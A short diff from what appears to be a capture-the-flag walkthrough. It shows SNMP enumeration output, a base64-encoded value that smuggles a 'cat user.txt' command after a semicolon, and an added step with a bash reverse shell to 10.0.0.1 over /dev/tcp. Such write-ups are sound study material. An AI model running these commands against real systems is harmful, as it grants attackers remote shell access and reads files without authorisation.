@@ -22,4 +22,4 @@ iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is pas
 echo "root;cat user.txt" | base64
 get the user flag
 
-6.
+6. bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
